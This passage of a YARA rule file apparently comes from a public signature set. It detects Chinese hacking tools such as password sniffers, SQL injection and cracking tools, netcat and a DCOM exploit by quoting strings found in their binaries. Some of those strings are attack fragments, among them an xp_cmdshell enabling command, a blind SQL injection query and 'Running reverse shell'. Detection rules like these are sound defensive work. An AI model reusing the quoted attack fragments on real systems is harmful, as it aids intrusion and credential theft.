{\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Down32.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"0365738acd728021b0ea2967c867f1014fd7dd75\"\n\tstrings:\n\t\t$s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n\t\t$s6 = \"down.exe\" fullword wide\n\t\t$s15 = \"get_Form1\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 137KB and all of them\n}\n\nrule MarathonTool_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MarathonTool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"75b5d25cdaa6a035981e5a33198fef0117c27c9c\"\n\tstrings:\n\t\t$s3 = \"http://localhost/retomysql/pista.aspx?id_pista=1\" fullword wide\n\t\t$s6 = \"SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS\" fullword wide\n\t\t$s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule Tools_termsrv {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file termsrv.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"294a693d252f8f4c85ad92ee8c618cebd94ef247\"\n\tstrings:\n\t\t$s1 = \"Iv\\\\SmSsWinStationApiPort\" fullword ascii\n\t\t$s2 = \" TSInternetUser \" fullword wide\n\t\t$s3 = \"KvInterlockedCompareExchange\" fullword ascii\n\t\t$s4 = \" WINS/DNS \" fullword wide\n\t\t$s5 = \"winerror=%1\" fullword wide\n\t\t$s6 = \"TermService \" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1150KB and all of them\n}\n\nrule scanms_scanms {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file scanms.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"47787dee6ddea2cb44ff27b6a5fd729273cea51a\"\n\tstrings:\n\t\t$s1 = \"--- ScanMs Tool --- (c) 2003 Internet Security Systems ---\" fullword ascii\n\t\t$s2 = \"Scans for systems vulnerable to MS03-026 vuln\" fullword ascii\n\t\t$s3 = \"More accurate for WinXP/Win2k, less accurate for WinNT\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s4 = \"added %d.%d.%d.%d-%d.%d.%d.%d\" fullword ascii\n\t\t$s5 = \"Internet Explorer 1.0\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and 3 of them\n}\n\nrule CN_Tools_PcShare {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PcShare.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ee7ba9784fae413d644cdf5a093bd93b73537652\"\n\tstrings:\n\t\t$s0 = \"title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;\" fullword wide\n\t\t$s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n\t\t$s2 = \"http://www.pcshares.cn/pcshare200/lostpass.asp\" fullword wide\n\t\t$s5 = \"port=%s;name=%s;pass=%s;\" fullword wide\n\t\t$s16 = \"%s\\\\ini\\\\*.dat\" fullword wide\n\t\t$s17 = \"pcinit.exe\" fullword wide\n\t\t$s18 = \"http://www.pcshare.cn\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 6000KB and 3 of them\n}\n\nrule pw_inspector {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pw-inspector.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4f8e3e101098fc3da65ed06117b3cb73c0a66215\"\n\tstrings:\n\t\t$s1 = \"-m MINLEN  minimum length of a valid password\" fullword ascii\n\t\t$s2 = \"http://www.thc.org\" fullword ascii\n\t\t$s3 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 460KB and all of them\n}\n\nrule Dll_LoadEx {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Dll_LoadEx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"213d9d0afb22fe723ff570cf69ff8cdb33ada150\"\n\tstrings:\n\t\t$s0 = \"WiNrOOt@126.com\" fullword wide\n\t\t$s1 = \"Dll_LoadEx.EXE\" fullword wide\n\t\t$s3 = \"You Already Loaded This DLL ! :(\" fullword ascii\n\t\t$s10 = \"Dll_LoadEx Microsoft \" fullword wide\n\t\t$s17 = \"Can't Load This Dll ! :(\" fullword ascii\n\t\t$s18 = \"WiNrOOt\" fullword wide\n\t\t$s20 = \" Dll_LoadEx(&A)...\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 120KB and 3 of them\n}\n\nrule dat_report {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file report.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4582a7c1d499bb96dad8e9b227e9d5de9becdfc2\"\n\tstrings:\n\t\t$s1 = \"<a href=\\\"http://www.xfocus.net\\\">X-Scan</a>\" fullword ascii\n\t\t$s2 = \"REPORT-ANALYSIS-OF-HOST\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 480KB and all of them\n}\n\nrule Dos_iis7 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file iis7.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"0a173c5ece2fd4ac8ecf9510e48e95f43ab68978\"\n\tstrings:\n\t\t$s0 = \"\\\\\\\\localhost\" fullword ascii\n\t\t$s1 = \"iis.run\" fullword ascii\n\t\t$s3 = \">Could not connecto %s\" fullword ascii\n\t\t$s5 = \"WHOAMI\" ascii\n\t\t$s13 = \"WinSta0\\\\Default\" fullword ascii  /* Goodware String - occured 22 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule SwitchSniffer {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SwitchSniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1e7507162154f67dff4417f1f5d18b4ade5cf0cd\"\n\tstrings:\n\t\t$s0 = \"NextSecurity.NET\" fullword wide\n\t\t$s2 = \"SwitchSniffer Setup\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and all of them\n}\n\nrule dbexpora {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file dbexpora.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b55b007ef091b2f33f7042814614564625a8c79f\"\n\tstrings:\n\t\t$s0 = \"SELECT A.USER FROM SYS.USER_USERS A \" fullword ascii\n\t\t$s12 = \"OCI 8 - OCIDescriptorFree\" fullword ascii\n\t\t$s13 = \"ORACommand *\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 835KB and all of them\n}\n\nrule SQLCracker {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SQLCracker.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1aa5755da1a9b050c4c49fc5c58fa133b8380410\"\n\tstrings:\n\t\t$s0 = \"msvbvm60.dll\" fullword ascii /* reversed goodware string 'lld.06mvbvsm' */\n\t\t$s1 = \"_CIcos\" fullword ascii\n\t\t$s2 = \"kernel32.dll\" fullword ascii\n\t\t$s3 = \"cKmhV\" fullword ascii\n\t\t$s4 = \"080404B0\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 125KB and all of them\n}\n\nrule FreeVersion_debug {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file debug.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d11e6c6f675b3be86e37e50184dadf0081506a89\"\n\tstrings:\n\t\t$s0 = \"c:\\\\Documents and Settings\\\\Administrator\\\\\" fullword ascii\n\t\t$s1 = \"Got WMI process Pid: %d\" ascii\n\t\t$s2 = \"This exploit will execute\" ascii\n\t\t$s6 = \"Found token %s \" ascii\n\t\t$s7 = \"Running reverse shell\" ascii\n\t\t$s10 = \"wmiprvse.exe\" fullword ascii\n\t\t$s12 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 820KB and 3 of them\n}\n\nrule Dos_look {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file look.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e1a37f31170e812185cf00a838835ee59b8f64ba\"\n\tstrings:\n\t\t$s1 = \"<description>CHKen QQ:41901298</description>\" fullword ascii\n\t\t$s2 = \"version=\\\"9.9.9.9\\\"\" fullword ascii\n\t\t$s3 = \"name=\\\"CH.Ken.Tool\\\"\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and all of them\n}\n\nrule NtGodMode {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NtGodMode.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8baac735e37523d28fdb6e736d03c67274f7db77\"\n\tstrings:\n\t\t$s0 = \"to HOST!\" fullword ascii\n\t\t$s1 = \"SS.EXE\" fullword ascii\n\t\t$s5 = \"lstrlen0\" fullword ascii\n\t\t$s6 = \"Virtual\" fullword ascii  /* Goodware String - occured 6 times */\n\t\t$s19 = \"RtlUnw\" fullword ascii /* Goodware String - occured 1 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 45KB and all of them\n}\n\nrule Dos_NC {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NC.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"57f0839433234285cc9df96198a6ca58248a4707\"\n\tstrings:\n\t\t$s1 = \"nc -l -p port [options] [hostname] [port]\" fullword ascii\n\t\t$s2 = \"invalid connection to [%s] from %s [%s] %d\" fullword ascii\n\t\t$s3 = \"post-rcv getsockname failed\" fullword ascii\n\t\t$s4 = \"Failed to execute shell, error = %s\" fullword ascii\n\t\t$s5 = \"UDP listen needs -p arg\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 290KB and all of them\n}\n\nrule WebCrack4_RouterPasswordCracking {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"00c68d1b1aa655dfd5bb693c13cdda9dbd34c638\"\n\tstrings:\n\t\t$s0 = \"http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD\" fullword ascii\n\t\t$s1 = \"Username: \\\"%s\\\", Password: \\\"%s\\\", Remarks: \\\"%s\\\"\" fullword ascii\n\t\t$s14 = \"user:\\\"%s\\\" pass: \\\"%s\\\" result=\\\"%s\\\"\" fullword ascii\n\t\t$s16 = \"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)\" fullword ascii\n\t\t$s20 = \"List count out of bounds (%d)+Operation not allowed on sorted string list%String\" wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and 2 of them\n}\n\nrule HScan_v1_20_oncrpc {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file oncrpc.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e8f047eed8d4f6d2f5dbaffdd0e6e4a09c5298a2\"\n\tstrings:\n\t\t$s1 = \"clnt_raw.c - Fatal header serialization error.\" fullword ascii\n\t\t$s2 = \"svctcp_.c - cannot getsockname or listen\" fullword ascii\n\t\t$s3 = \"too many connections (%d), compilation constant FD_SETSIZE was only %d\" fullword ascii\n\t\t$s4 = \"svc_run: - select failed\" fullword ascii\n\t\t$s5 = \"@(#)bindresvport.c\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 340KB and 4 of them\n}\n\nrule hscan_gui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan-gui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1885f0b7be87f51c304b39bc04b9423539825c69\"\n\tstrings:\n\t\t$s0 = \"Hscan.EXE\" fullword wide\n\t\t$s1 = \"RestTool.EXE\" fullword ascii\n\t\t$s3 = \"Hscan Application \" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule S_MultiFunction_Scanners_s {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file s.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"79b60ffa1c0f73b3c47e72118e0f600fcd86b355\"\n\tstrings:\n\t\t$s0 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe /l=\" fullword ascii\n\t\t$s1 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe\" fullword ascii\n\t\t$s2 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe tcp \" fullword ascii\n\t\t$s3 = \"explorer.exe http://www.hackdos.com\" fullword ascii\n\t\t$s4 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe\" fullword ascii\n\t\t$s5 = \"Failed to read file or invalid data in file!\" fullword ascii\n\t\t$s6 = \"www.hackdos.com\" fullword ascii\n\t\t$s7 = \"WTNE / MADE BY E COMPILER - WUTAO \" fullword ascii\n\t\t$s11 = \"The interface of kernel library is invalid!\" fullword ascii\n\t\t$s12 = \"eventvwr\" fullword ascii\n\t\t$s13 = \"Failed to decompress data!\" fullword ascii\n\t\t$s14 = \"NOTEPAD.EXE result.txt\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 8000KB and 4 of them\n}\n\nrule Dos_GetPass {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file GetPass.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d18d952b24110b83abd17e042f9deee679de6a1a\"\n\tstrings:\n\t\t$s0 = \"GetLogonS\" ascii\n\t\t$s3 = \"/showthread.php?t=156643\" ascii\n\t\t$s8 = \"To Run As Administ\" ascii\n\t\t$s18 = \"EnableDebugPrivileg\" fullword ascii\n\t\t$s19 = \"sedebugnameValue\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 890KB and all of them\n}\n\nrule update_PcMain {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PcMain.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"aa68323aaec0269b0f7e697e69cce4d00a949caa\"\n\tstrings:\n\t\t$s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322\" ascii\n\t\t$s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n\t\t$s2 = \"SOFTWARE\\\\Classes\\\\HTTP\\\\shell\\\\open\\\\command\" fullword ascii\n\t\t$s3 = \"\\\\svchost.exe -k \" fullword ascii\n\t\t$s4 = \"SYSTEM\\\\ControlSet001\\\\Services\\\\%s\" fullword ascii\n\t\t$s9 = \"Global\\\\%s-key-event\" fullword ascii\n\t\t$s10 = \"%d%d.exe\" fullword ascii\n\t\t$s14 = \"%d.exe\" fullword ascii\n\t\t$s15 = \"Global\\\\%s-key-metux\" fullword ascii\n\t\t$s18 = \"GET / HTTP/1.1\" fullword ascii\n\t\t$s19 = \"\\\\Services\\\\\" fullword ascii\n\t\t$s20 = \"qy001id=%d;qy001guid=%s\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and 4 of them\n}\n\nrule Dos_sys {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sys.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b5837047443f8bc62284a0045982aaae8bab6f18\"\n\tstrings:\n\t\t$s0 = \"'SeDebugPrivilegeOpen \" fullword ascii\n\t\t$s6 = \"Author: Cyg07*2\" fullword ascii\n\t\t$s12 = \"from golds7n[LAG]'J\" fullword ascii\n\t\t$s14 = \"DAMAGE\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule dat_xpf {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xpf.sys\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"761125ab594f8dc996da4ce8ce50deba49c81846\"\n\tstrings:\n\t\t$s1 = \"UnHook IoGetDeviceObjectPointer ok!\" fullword ascii\n\t\t$s2 = \"\\\\Device\\\\XScanPF\" fullword wide\n\t\t$s3 = \"\\\\DosDevices\\\\XScanPF\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule Project1 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Project1.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d1a5e3b646a16a7fcccf03759bd0f96480111c96\"\n\tstrings:\n\t\t$s1 = \"EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'\" fullword ascii\n\t\t$s2 = \"Password.txt\" fullword ascii\n\t\t$s3 = \"LoginPrompt\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule Arp_EMP_v1_0 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Arp EMP v1.0.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ae4954c142ad1552a2abaef5636c7ef68fdd99ee\"\n\tstrings:\n\t\t$s0 = \"Arp EMP v1.0.exe\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule CN_Tools_MyUPnP {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MyUPnP.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"15b6fca7e42cd2800ba82c739552e7ffee967000\"\n\tstrings:\n\t\t$s1 = \"<description>BYTELINKER.COM</description>\" fullword ascii\n\t\t$s2 = \"myupnp.exe\" fullword ascii\n\t\t$s3 = \"LOADER ERROR\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1500KB and all of them\n}\n\nrule CN_Tools_Shiell {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Shiell.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b432d80c37abe354d344b949c8730929d8f9817a\"\n\tstrings:\n\t\t$s1 = \"C:\\\\Users\\\\Tong\\\\Documents\\\\Visual Studio 2012\\\\Projects\\\\Shift shell\" ascii\n\t\t$s2 = \"C:\\\\Windows\\\\System32\\\\Shiell.exe\" fullword wide\n\t\t$s3 = \"Shift shell.exe\" fullword wide\n\t\t$s4 = \"\\\" /v debugger /t REG_SZ /d \\\"\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1500KB and 2 of them\n}\n\nrule cndcom_cndcom {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file cndcom.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"08bbe6312342b28b43201125bd8c518531de8082\"\n\tstrings:\n\t\t$s1 = \"- Rewritten by HDM last <hdm [at] metasploit.com>\" fullword ascii\n\t\t$s2 = \"- Usage: %s <Target ID> <Target IP>\" fullword ascii\n\t\t$s3 = \"- Remote DCOM RPC Buffer Overflow Exploit\" fullword ascii\n\t\t$s4 = \"- Warning:This Code is more like a dos tool!(Modify by pingker)\" fullword ascii\n\t\t$s5 = \"Windows NT SP6 (Chinese)\" fullword ascii\n\t\t$s6 = \"- Original code by FlashSky and Benjurry\" fullword ascii\n\t\t$s7 = \"\\\\C$\\\\123456111111111111111.doc\" fullword wide\n\t\t$s8 = \"shell3all.c\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule IsDebug_V1_4 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IsDebug V1.4.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ca32474c358b4402421ece1cb31714fbb088b69a\"\n\tstrings:\n\t\t$s0 = \"IsDebug.dll\" fullword ascii\n\t\t$s1 = \"SV Dumper V1.0\" fullword wide\n\t\t$s2 = \"(IsDebuggerPresent byte Patcher)\" fullword ascii\n\t\t$s8 = \"Error WriteMemory failed\" fullword ascii\n\t\t$s9 = \"IsDebugPresent\" fullword ascii\n\t\t$s10 = \"idb_Autoload\" fullword ascii\n\t\t$s11 = \"Bin Files\" fullword ascii\n\t\t$s12 = \"MASM32 version\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule HTTPSCANNER {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file HTTPSCANNER.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ae2929346944c1ea3411a4562e9d5e2f765d088a\"\n\tstrings:\n\t\t$s1 = \"HttpScanner.exe\" fullword wide\n\t\t$s2 = \"HttpScanner\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3500KB and all of them\n}\n\nrule HScan_v1_20_PipeCmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PipeCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"64403ce63b28b544646a30da3be2f395788542d6\"\n\tstrings:\n\t\t$s1 = \"%SystemRoot%\\\\system32\\\\PipeCmdSrv.exe\" fullword ascii\n\t\t$s2 = \"PipeCmd.exe\" fullword wide\n\t\t$s3 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n\t\t$s4 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s5 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n\t\t$s7 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n\t\t$s8 = \"Connecting to Remote Server ...Failed\" fullword ascii\n\t\t$s9 = \"PIPECMDSRV\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 4 of them\n}\n\nrule Dos_fp {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file fp.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"41d57d356098ff55fe0e1f0bcaa9317df5a2a45c\"\n\tstrings:\n\t\t$s1 = \"fpipe -l 53 -s 53 -r 80 192.168.1.101\" fullword ascii\n\t\t$s2 = \"FPipe.exe\" fullword wide\n\t\t$s3 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s4 = \"%s %s port %d. Address is already in use\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 65KB and all of them\n}\n\nrule Dos_netstat {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file netstat.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d0444b7bd936b5fc490b865a604e97c22d97e598\"\n\tstrings:\n\t\t$s0 = \"w03a2409.dll\" fullword ascii\n\t\t$s1 = \"Retransmission Timeout Algorithm    = unknown (%1!u!)\" fullword wide  /* Goodware String - occured 2 times */\n\t\t$s2 = \"Administrative Status  = %1!u!\" fullword wide  /* Goodware String - occured 2 times */\n\t\t$s3 = \"Packet Too Big            %1!-10u!  %2!-10u!\" fullword wide  /* Goodware String - occured 2 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule CN_Tools_xsniff {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xsniff.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d61d7329ac74f66245a92c4505a327c85875c577\"\n\tstrings:\n\t\t$s0 = \"xsiff.exe -pass -hide -log pass.log\" fullword ascii\n\t\t$s1 = \"HOST: %s USER: %s, PASS: %s\" fullword ascii\n\t\t$s2 = \"xsiff.exe -tcp -udp -asc -addr 192.168.1.1\" fullword ascii\n\t\t$s10 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n\t\t$s11 = \"%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule MSSqlPass {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MSSqlPass.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"172b4e31ed15d1275ac07f3acbf499daf9a055d7\"\n\tstrings:\n\t\t$s0 = \"Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server\" wide\n\t\t$s1 = \"empv.exe\" fullword wide\n\t\t$s2 = \"Enterprise Manager PassView\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 120KB and all of them\n}\n\nrule WSockExpert {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file WSockExpert.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2962bf7b0883ceda5e14b8dad86742f95b50f7bf\"\n\tstrings:\n\t\t$s1 = \"OpenProcessCmdExecute!\" fullword ascii\n\t\t$s2 = \"http://www.hackp.com\" fullword ascii\n\t\t$s3 = \"'%s' is not a valid time!'%s' is not a valid date and time\" fullword wide\n\t\t$s4 = \"SaveSelectedFilterCmdExecute\" fullword ascii\n\t\t$s5 = \"PasswordChar@\" fullword ascii\n\t\t$s6 = \"WSockHook.DLL\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2500KB and 4 of them\n}\n\nrule Ms_Viru_racle {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file racle.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"13116078fff5c87b56179c5438f008caf6c98ecb\"\n\tstrings:\n\t\t$s0 = \"PsInitialSystemProcess @%p\" fullword ascii\n\t\t$s1 = \"PsLookupProcessByProcessId(%u) Failed\" fullword ascii\n\t\t$s2 = \"PsLookupProcessByProcessId(%u) => %p\" fullword ascii\n\t\t$s3 = \"FirstStage() Loaded, CurrentThread @%p Stack %p - %p\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 210KB and all of them\n}\n\nrule lamescan3 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file 